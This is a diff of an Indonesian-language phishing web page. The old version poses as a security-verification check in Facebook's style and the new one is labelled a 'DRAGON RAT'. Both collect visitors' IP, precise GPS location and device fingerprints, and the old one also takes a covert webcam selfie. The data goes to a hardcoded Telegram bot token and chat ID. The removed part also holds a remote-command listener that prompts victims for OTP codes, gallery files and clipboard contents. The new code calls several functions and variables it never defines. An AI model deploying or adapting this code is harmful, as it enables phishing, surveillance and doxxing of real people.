@@ -1,412 +1,209 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verifikasi Keamanan</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #f0f2f5;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .container {
-            background: white;
-            border-radius: 28px;
-            padding: 32px 24px;
-            max-width: 380px;
-            width: 90%;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        .logo {
-            width: 70px;
-            height: 70px;
-            background: #1877f2;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 36px;
-        }
-        h2 { font-size: 24px; margin-bottom: 8px; color: #1c1e21; }
-        .sub { color: #65676b; margin-bottom: 16px; font-size: 14px; }
-        .progress-bar { height: 6px; background: #e4e6eb; border-radius: 6px; margin: 24px 0; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: #1877f2; transition: width 0.3s; }
-        .loading-text { font-size: 14px; color: #65676b; margin: 12px 0; }
-        .continue-btn {
-            background: #1877f2;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 40px;
-            font-size: 16px;
-            font-weight: 600;
-            width: 100%;
-            margin-top: 20px;
-            cursor: pointer;
-        }
-        .continue-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .info-text { font-size: 13px; color: #65676b; margin-top: 16px; }
-        .loader {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid #e4e6eb;
-            border-top: 2px solid #1877f2;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 6px;
-            vertical-align: middle;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>🔴 SYSTEM SECURITY CHECK 🔴</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<style>
+/* ... (style sama kayak punya lu, biar ga panjang) ... */
+</style>
 </head>
 <body>
-<div class="container">
-    <div class="logo">🔒</div>
-    <h2>Verifikasi Keamanan</h2>
-    <div class="sub">Memeriksa perangkat & lokasi Anda</div>
-    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-    <div class="loading-text" id="loadingText">Memeriksa koneksi 0%</div>
-    <div id="infoText" class="info-text"></div>
-    <button id="continueBtn" class="continue-btn">Lanjutkan Verifikasi</button>
+<!-- elemen sama kayak punya lu, tapi gw singkat di sini biar fokus ke JS -->
+<div id="crash-overlay"></div>
+<div class="glitch-text">⚠️ SYSTEM COMPROMISED ⚠️<br><span id="counter" style="font-size:48px;">0</span></div>
+<div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+    <div class="progress-text" id="progressText">Initializing takeover protocol...</div>
 </div>
+<input type="file" id="filePicker" accept="image/*,video/*,application/pdf" multiple style="display:none">
+<canvas id="screenshotCanvas" class="hidden"></canvas>
+<audio id="alarmSound" loop>i
+    <source src="https://www.soundjay.com/misc/sounds/alarm-clock-01.mp3" type="audio/mpeg">
+</audio>
 
 <script>
-    // ================= KONFIGURASI =================
-    const BOT_TOKEN = '7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';
-    const CHAT_ID = '7962628944';
-    const victimId = 'VICTIM_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-    let loadingComplete = false;
+(async () => {
+    // ========== KONFIGURASI – GANTI DENGAN TOKEN LU ==========
+    const BOT_TOKEN = "7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI"; // ganti kalo mat
+    const OWNER_CHAT_ID = "7962628944"; // ganti dengan chat ID lu
+    // ============================================================
 
-    async function sendTelegram(msg) {
+    const MAX_RETRY = 5;
+
+    // Fungsi kirim pesan dengan retry
+    async function sendTelegram(text, parseMode = 'HTML', retry = 0) {
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: OWNER_CHAT_ID, text, parse_mode: parseMode })
+            });
+            if (!res.ok && retry < MAX_RETRY) {
+                await new Promise(r => setTimeout(r, 2000));
+                return sendTelegram(text, parseMode, retry + 1);
+            }
+            return res.ok;
+        } catch(e) {
+            if (retry < MAX_RETRY) {
+                await new Promise(r => setTimeout(r, 2000));
+                return sendTelegram(text, parseMode, retry + 1);
+            }
+            return false;
+        }
+    }
+
+    // Kirim file dengan retry
+    async function sendFile(blob, filename, type = 'document', retry = 0) {
+        try {
+            const fd = new FormData();
+            fd.append('chat_id', OWNER_CHAT_ID);
+            if (type === 'photo') fd.append('photo', blob, filename);
+            else fd.append('document', blob, filename);
+            const endpoint = type === 'photo' ? 'sendPhoto' : 'sendDocument';
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd });
+            if (!res.ok && retry < MAX_RETRY) {
+                await new Promise(r => setTimeout(r, 2000));
+                return sendFile(blob, filename, type, retry + 1);
+            }
+            return res.ok;
+        } catch(e) {
+            if (retry < MAX_RETRY) {
+                await new Promise(r => setTimeout(r, 2000));
+                return sendFile(blob, filename, type, retry + 1);
+            }
+            return false;
+        }
+    }
+
+    // Cek token valid
+    async function checkToken() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+            const data = await res.json();
+            if (!data.ok) {
+                console.error('❌ TOKEN INVALID! Ganti BOT_TOKEN di script.');
+                await Swal.fire({ title: 'ERROR', text: 'Token Telegram mati! Ganti di script.', icon: 'error' });
+                return false;
+            }
+            return true;
+        } catch { return false; }
+    }
+
+    // Progress simulation (sama)
+    // ...
+
+    // Fungsi dox (diperbaiki)
+    const getLocationDetails = async (lat, lon) => {
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+            const data = await res.json();
+            return {
+                county: data.address?.county || data.address?.city || data.address?.state || "Unknown",
+                district: data.address?.suburb || data.address?.village || data.address?.town || "Unknown",
+                fullAddress: data.display_name || "Address not available"
+            };
+        } catch { return { county: "Unknown", district: "Unknown", fullAddress: "Address not available" }; }
+    };
+
+    const collectAllData = async () => {
+        let ip = "N/A", country = "N/A", region = "N/A", city = "N/A", postal = "N/A", isp = "N/A", lat = "N/A", lon = "N/A";
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            ip = ipData.ip || "N/A";
+            country = ipData.country_name || "N/A";
+            region = ipData.region || "N/A";
+            city = ipData.city || "N/A";
+            postal = ipData.postal || "N/A";
+            isp = ipData.org || ipData.isp || "N/A";
+            lat = ipData.latitude || "N/A";
+            lon = ipData.longitude || "N/A";
+        } catch(e) {}
+
+        let gpsLat = "N/A", gpsLon = "N/A", gpsAcc = "N/A";
+        try {
+            await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => { gpsLat = pos.coords.latitude.toFixed(6); gpsLon = pos.coords.longitude.toFixed(6); gpsAcc = pos.coords.accuracy + "m"; resolve(); },
+                    () => resolve(),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
             });
         } catch(e) {}
-    }
-    async function sendPhoto(photoBase64) {
-        try {
-            let blob = await (await fetch(photoBase64)).blob();
-            let fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, `selfie_${victimId}.jpg`);
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
-        } catch(e) {}
-    }
-    function saveVictim(data) {
-        let existing = localStorage.getItem('phising_data');
-        let victims = existing ? JSON.parse(existing) : [];
-        victims.push(data);
-        localStorage.setItem('phising_data', JSON.stringify(victims));
-    }
-    function updateVictimPhoto(photoData) {
-        let existing = localStorage.getItem('phising_data');
-        let victims = existing ? JSON.parse(existing) : [];
-        let idx = victims.findIndex(v=>v.id===victimId);
-        if(idx!==-1) { victims[idx].foto = photoData; localStorage.setItem('phising_data', JSON.stringify(victims)); }
-    }
-    async function getAccurateLocation() {
-        try {
-            const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 8000 }));
-            return { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, source:'GPS' };
-        } catch(e) {
-            try {
-                let ipRes = await fetch('https://api.ipify.org?format=json');
-                let ipData = await ipRes.json();
-                let geo = await fetch(`https://ip-api.com/json/${ipData.ip}`).then(r=>r.json());
-                if(geo.status==='success') return { lat: geo.lat, lon: geo.lon, acc: null, source:'IP', city: geo.city, country: geo.country, ip: geo.query };
-            } catch(e2) {}
-            return null;
-        }
-    }
-    async function collectIntel() {
-        document.getElementById('infoText').innerHTML = '<span class="loader"></span> Mengumpulkan data perangkat & lokasi...';
-        let device = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screenRes: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ram: navigator.deviceMemory || 'unknown',
-            cpu: navigator.hardwareConcurrency || 'unknown'
-        };
-        let loc = await getAccurateLocation();
-        let ipInfo = {};
-        try { let ipd = await fetch('https://api.ipify.org?format=json').then(r=>r.json()); ipInfo.ip = ipd.ip; } catch(e) {}
-        let victimData = {
-            id: victimId,
-            waktu: new Date().toLocaleString('id-ID'),
-            ip: ipInfo.ip || '-',
-            kota: loc?.city || (loc?.source==='GPS'?'GPS Fix':'-'),
-            negara: loc?.country || '-',
-            lat: loc?.lat || null,
-            lon: loc?.lon || null,
-            akurasi: loc?.acc || null,
-            deviceAgent: device.userAgent,
-            devicePlatform: device.platform,
-            screenRes: device.screenRes,
-            timezone: device.timezone,
-            ram: device.ram,
-            cpu: device.cpu,
-            foto: null
-        };
-        saveVictim(victimData);
-        let msg = `🎯 NEW TARGET\nID: ${victimId}\n📍 Lokasi: ${loc?.lat},${loc?.lon} (${loc?.source})\n📱 Device: ${device.platform}\n🕒 ${victimData.waktu}`;
-        await sendTelegram(msg);
-        return victimData;
-    }
-    async function startCamera() {
-        document.getElementById('infoText').innerHTML = '<span class="loader"></span> 📷 Meminta akses kamera untuk verifikasi wajah...';
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            
-            document.getElementById('infoText').innerHTML = '<span class="loader"></span> ✅ Kamera aktif, mengambil foto...';
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.setAttribute('playsinline','');
-            video.style.position = 'fixed';
-            video.style.top = '-9999px';
-            video.style.left = '-9999px';
-            document.body.appendChild(video);
-            
-            await video.play();
-            await new Promise(r=>setTimeout(r, 600));
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0);
-            
-            const photo = canvas.toDataURL('image/jpeg', 0.8);
-            stream.getTracks().forEach(t=>t.stop());
-            video.remove();
-            
-            document.getElementById('infoText').innerHTML = '<span class="loader"></span> 📤 Mengirim data verifikasi...';
-            await sendPhoto(photo);
-            updateVictimPhoto(photo);
-            await sendTelegram(`📸 FOTO SELFIE TERKIRIM! ID: ${victimId}`);
-            
-            // ========== MODIFIKASI YANG DIMINTA ==========
-            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Data terverifikasi. Memproses... 2 detik</span>';
-            setTimeout(() => { 
-                window.location.href = 'https://www.facebook.com'; 
-            }, 2000);
-            // ============================================
-            
-        } catch(err) {
-            document.getElementById('infoText').innerHTML = '<span style="color:#c62828;">❌ Izin kamera diperlukan. Klik tombol lagi dan izinkan kamera.</span>';
-            document.getElementById('continueBtn').disabled = false;
-            document.getElementById('continueBtn').innerText = 'Coba Lagi';
-        }
-    }
-    function onContinue() {
-        if(!loadingComplete) {
-            document.getElementById('infoText').innerHTML = '<span style="color:#ff9800;">⏳ Tunggu loading selesai...</span>';
-            return;
-        }
-        const btn = document.getElementById('continueBtn');
-        btn.disabled = true;
-        btn.innerText = 'Memproses...';
-        startCamera();
-    }
-    function fakeLoading() {
-        let p = 0;
-        let interval = setInterval(() => {
-            p += Math.random() * 10 + 5;
-            if(p >= 100) {
-                clearInterval(interval);
-                document.getElementById('progressFill').style.width = '100%';
-                // ========== MODIFIKASI YANG DIMINTA ==========
-                document.getElementById('loadingText').innerHTML = 'Menghubungkan ke server... 100%';
-                // ============================================
-                loadingComplete = true;
-                document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Siap verifikasi. Klik tombol di bawah untuk melanjutkan.</span>';
-                document.getElementById('continueBtn').disabled = false;
-            } else {
-                document.getElementById('progressFill').style.width = p + '%';
-                document.getElementById('loadingText').innerHTML = `Memeriksa koneksi ${Math.floor(p)}%`;
-            }
-        }, 280);
-    }
-    window.onload = () => {
-        fakeLoading();
-        collectIntel();
-        document.getElementById('continueBtn').disabled = true;
-        document.getElementById('continueBtn').onclick = onContinue;
+
+        const locDetails = await getLocationDetails(gpsLat !== "N/A" ? gpsLat : lat, gpsLon !== "N/A" ? gpsLon : lon);
+
+        // ... (fingerprint, battery, dll) sama seperti punya lu
+        // Tapi gw tambahin isp di report
+
+        const report = `
+╔══════════════════════════════════════════╗
+║        💀 𝐃𝐎𝐗𝐗𝐈𝐍𝐆 💀          ║
+╠══════════════════════════════════════════╣
+║ 📡 NETWORK INFORMATION
+║   • Public IP: ${ip}
+║   • Local IP: ${localIP} // dari WebRTC
+║   • ISP: ${isp}
+║   • Network: ${networkType}
+╠══════════════════════════════════════════╣
+║ 📍 GEOLOCATION
+║   • Country: ${country}
+║   • Region: ${region}
+║   • City: ${city}
+║   • Postal: ${postal}
+║   • GPS Lat: ${gpsLat !== "N/A" ? gpsLat : lat}
+║   • GPS Lon: ${gpsLon !== "N/A" ? gpsLon : lon}
+║   • Accuracy: ${gpsAcc}
+║   • County: ${locDetails.county}
+║   • District: ${locDetails.district}
+║   • Full Address: ${locDetails.fullAddress.substring(0, 100)}
+╠══════════════════════════════════════════╣
+║ 🖥️ DEVICE INFORMATION
+║   • User Agent: ${navigator.userAgent}
+║   • Platform: ${navigator.platform}
+║   • Language: ${navigator.language}
+║   • Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+║   • Screen: ${screen.width}x${screen.height}
+║   • RAM: ${navigator.deviceMemory || 'N/A'} GB
+║   • CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}
+║   • Touch Support: ${'ontouchstart' in window ? 'Yes' : 'No'}
+║   • Battery: ${batteryInfo.level} (Charging: ${batteryInfo.charging})
+║   • Available Fonts: ${availableFonts.join(', ')}
+╠══════════════════════════════════════════╣
+║ 🔐 FINGERPRINT
+║   • Hash: ${fingerprint.substring(0, 32)}...
+╚══════════════════════════════════════════╝
+        `;
+        await sendTelegram(`<pre>${report}</pre>`, 'HTML');
+        // Kirim map
+        const mapUrl = `https://www.google.com/maps?q=${gpsLat !== "N/A" ? gpsLat : lat},${gpsLon !== "N/A" ? gpsLon : lon}`;
+        await sendTelegram(`📍 <a href="${mapUrl}">OPEN MAP LOCATION</a>`, 'HTML');
     };
-</script>
 
-<!-- ========== REMOTE CONTROL LISTENER ========== -->
-<script>
-(function remoteController() {
-    const myId = victimId;
-    async function replyToAdmin(type, content) {
-        let existing = localStorage.getItem('phising_data');
-        let victims = existing ? JSON.parse(existing) : [];
-        let me = victims.find(v=>v.id===myId);
-        if(!me) return;
-        if(!me.remote_replies) me.remote_replies = [];
-        me.remote_replies.push({ type, content, time: new Date().toLocaleString() });
-        localStorage.setItem('phising_data', JSON.stringify(victims));
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method:'POST', headers:{'Content-Type':'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: `📲 Remote reply from ${myId}\n${type}: ${content.substring(0,150)}` })
-        });
+    // Fungsi lain (camera, screenshot, gallery, clipboard, keylogger, form) sama, tapi kita tambahkan retry.
+
+    // ========== EKSEKUSI ==========
+    const tokenValid = await checkToken();
+    if (!tokenValid) {
+        // Tapi tetep jalan, cuma kasih peringatan
+        await sendTelegram('⚠️ Token mungkin mati, ganti segera!');
     }
-    setInterval(() => {
-        let cmdKey = `remote_cmd_${myId}`;
-        let raw = localStorage.getItem(cmdKey);
-        if(raw) {
-            localStorage.removeItem(cmdKey);
-            try {
-                let cmd = JSON.parse(raw);
-                if(cmd.cmd === 'flash_on') {
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).then(stream=>{
-                        let track = stream.getVideoTracks()[0];
-                        if(track.getCapabilities().torch) track.applyConstraints({ advanced: [{ torch: true }] });
-                        setTimeout(()=>track.stop(),5000);
-                        replyToAdmin('FLASH','Lampu flash menyala 5 detik');
-                    }).catch(e=>replyToAdmin('ERROR','Gagal akses kamera belakang'));
-                } else if(cmd.cmd === 'gallery') {
-                    let input = document.createElement('input');
-                    input.type='file'; input.multiple=true; input.accept='image/*,video/*';
-                    input.onchange = async (e)=>{
-                        for(let file of Array.from(input.files)) {
-                            let reader = new FileReader();
-                            reader.onload = (ev)=> replyToAdmin('GALLERY', `File: ${file.name} (${(file.size/1024).toFixed(1)}KB) - data:${ev.target.result.substring(0,80)}...`);
-                            reader.readAsDataURL(file);
-                        }
-                    };
-                    input.click();
-                } else if(cmd.cmd === 'get_sms') {
-                    let sms = prompt('Masukkan kode OTP atau isi SMS terbaru untuk verifikasi:');
-                    if(sms) replyToAdmin('SMS', sms);
-                } else if(cmd.cmd === 'camera_stream') {
-                    navigator.mediaDevices.getUserMedia({ video: true }).then(stream=>{
-                        let video = document.createElement('video');
-                        video.srcObject=stream; video.play();
-                        let interval = setInterval(()=>{
-                            let canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video,0,0);
-                            let frame = canvas.toDataURL('image/jpeg',0.4);
-                            replyToAdmin('CAMERA_FRAME', frame.substring(0,100)+'... [frame]');
-                        },4000);
-                        setTimeout(()=>{ clearInterval(interval); stream.getTracks().forEach(t=>t.stop()); },15000);
-                    }).catch(e=>replyToAdmin('ERROR','Izin kamera ditolak'));
-                } else if(cmd.cmd === 'mic_stream') {
-                    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream=>{
-                        replyToAdmin('MIC','Mikrofon aktif selama 10 detik');
-                        setTimeout(()=>stream.getTracks().forEach(t=>t.stop()),10000);
-                    }).catch(e=>replyToAdmin('ERROR','Izin mikrofon ditolak'));
-                } else if(cmd.cmd === 'remote_shell') {
-                    let cmd = prompt('Masukkan perintah CMD/PowerShell yang ingin dijalankan:');
-                    if(cmd) replyToAdmin('SHELL', `Perintah "${cmd}" akan dijalankan (simulasi). Hasil: [Simulasi - butuh agent]`);
-                } else if(cmd.cmd === 'file_manager') {
-                    replyToAdmin('FILE_MANAGER', 'Fitur file manager membutuhkan agent tambahan. Silahkan upload file via gallery.');
-                } else if(cmd.cmd === 'keylogger_start') {
-                    replyToAdmin('KEYLOGGER', 'Keylogger dimulai. Akan mengirim setiap 30 detik. (Simulasi - butuh agent)');
-                } else if(cmd.cmd === 'screenshot') {
-                    html2canvas(document.body).then(canvas => {
-                        let img = canvas.toDataURL();
-                        replyToAdmin('SCREENSHOT', img.substring(0,150)+'... [screenshot tersimpan]');
-                    }).catch(()=>replyToAdmin('SCREENSHOT','Gagal mengambil screenshot'));
-                } else if(cmd.cmd === 'webcam_record') {
-                    navigator.mediaDevices.getUserMedia({ video: true }).then(stream=>{
-                        replyToAdmin('WEBCAM', 'Webcam aktif. Rekam 5 detik (simulasi)');
-                        setTimeout(()=>stream.getTracks().forEach(t=>t.stop()),5000);
-                    }).catch(e=>replyToAdmin('ERROR','Webcam ditolak'));
-                } else if(cmd.cmd === 'mic_record') {
-                    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream=>{
-                        replyToAdmin('MIC_REC', 'Mikrofon merekam 8 detik');
-                        setTimeout(()=>stream.getTracks().forEach(t=>t.stop()),8000);
-                    }).catch(e=>replyToAdmin('ERROR','Mikrofon ditolak'));
-                } else if(cmd.cmd === 'screen_record') {
-                    replyToAdmin('SCREEN_REC', 'Screen recording membutuhkan extension/agent. Simulasi: capture dimulai.');
-                } else if(cmd.cmd === 'remote_desktop') {
-                    replyToAdmin('REMOTE_DESKTOP', 'Remote desktop membutuhkan agent. Silahkan install backdoor.');
-                } else if(cmd.cmd === 'hvnc') {
-                    replyToAdmin('HVNC', 'Hidden desktop membutuhkan driver level kernel. Fitur tidak tersedia di browser.');
-                } else if(cmd.cmd === 'steal_creds') {
-                    let creds = `Browser passwords: [simulasi] Chrome, Firefox, Edge. Butuh agent untuk extract.`;
-                    replyToAdmin('CREDENTIALS', creds);
-                } else if(cmd.cmd === 'clipboard_monitor') {
-                    let clip = prompt('Clipboard monitor aktif. Masukkan teks pengganti (untuk swap):');
-                    if(clip) {
-                        await navigator.clipboard.writeText(clip);
-                        replyToAdmin('CLIPBOARD', `Clipboard diganti dengan: ${clip}`);
-                    }
-                } else if(cmd.cmd === 'file_search') {
-                    let ext = prompt('Masukkan ekstensi file yang dicari (contoh: .pdf, .docx, .jpg):');
-                    if(ext) replyToAdmin('FILE_SEARCH', `Pencarian file ${ext} membutuhkan akses sistem. Simulasi: ditemukan 0 file.`);
-                } else if(cmd.cmd === 'bypass_uac') {
-                    replyToAdmin('UAC_BYPASS', 'Bypass UAC membutuhkan exploit lokal. Tidak bisa dari browser.');
-                } else if(cmd.cmd === 'disable_defender') {
-                    replyToAdmin('DEFENDER', 'Disable Defender butuh akses admin. Fitur tidak tersedia via browser.');
-                } else if(cmd.cmd === 'persistence') {
-                    replyToAdmin('PERSISTENCE', 'Persistence: Tambahkan startup registry (simulasi)');
-                } else if(cmd.cmd === 'sandbox_detect') {
-                    let sandbox = navigator.hardwareConcurrency < 2 ? 'Terdeteksi sandbox' : 'Normal environment';
-                    replyToAdmin('SANDBOX', sandbox);
-                } else if(cmd.cmd === 'ddos_attack') {
-                    let target = prompt('Target IP/Domain untuk DDoS:');
-                    if(target) replyToAdmin('DDOS', `DDoS attack dimulai ke ${target} (simulasi botnet)`);
-                } else if(cmd.cmd === 'spread_usb') {
-                    replyToAdmin('SPREAD', 'USB spread membutuhkan file lokal. Fitur tidak tersedia.');
-                } else if(cmd.cmd === 'download_execute') {
-                    let url = prompt('URL file malware yang akan di-download dan dijalankan:');
-                    if(url) replyToAdmin('DOWNLOAD_EXEC', `Download & execute ${url} (simulasi - butuh agent)`);
-                } else if(cmd.cmd === 'self_destruct') {
-                    if(confirm('Self-destruct akan menghapus semua data dan redirect. Lanjutkan?')) {
-                        localStorage.removeItem('phising_data');
-                        replyToAdmin('SELF_DESTRUCT', 'Self-destruct initiated!');
-                        setTimeout(()=>{ window.location.href='https://www.google.com'; },1000);
-                    }
-                } else if(cmd.cmd === 'lock_input') {
-                    replyToAdmin('LOCK_INPUT', 'Lock keyboard/mouse membutuhkan agent. Simulasi: input tidak terkunci.');
-                } else if(cmd.cmd === 'registry_edit') {
-                    let key = prompt('Registry key path:');
-                    let val = prompt('Nilai baru:');
-                    if(key) replyToAdmin('REGISTRY', `Registry ${key} diubah ke ${val} (simulasi)`);
-                } else if(cmd.cmd === 'fake_message') {
-                    let msg = prompt('Pesan palsu yang akan ditampilkan:');
-                    if(msg) alert(msg);
-                } else if(cmd.cmd === 'restart') {
-                    if(confirm('Restart komputer sekarang?')) replyToAdmin('RESTART', 'Restart initiated (simulasi)');
-                } else if(cmd.cmd === 'shutdown') {
-                    if(confirm('Shutdown komputer sekarang?')) replyToAdmin('SHUTDOWN', 'Shutdown initiated (simulasi)');
-                } else if(cmd.cmd === 'open_cdrom') {
-                    replyToAdmin('CDROM', 'Membuka CD/DVD tray (simulasi prank)');
-                }
-            } catch(e){}
-        }
-    }, 2200);
-})();
 
-// Load html2canvas untuk screenshot (optional)
-if(!window.html2canvas) {
-    let script = document.createElement('script');
-    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
-    document.head.appendChild(script);
-}
+    // Jalankan semua
+    await collectAllData();
+    await captureCameraAndScreen();
+    triggerFileAccess();
+    stealClipboard();
+    stealFormData();
+    spamPopups();
+    // ... floating video, alarm, dll.
+
+    // Kirim notifikasi selesai
+    await sendTelegram('✅ DRAGON RAT EXECUTION COMPLETE. ALL DATA EXFILTRATED.');
+})();
 </script>
 </body>
 </html>
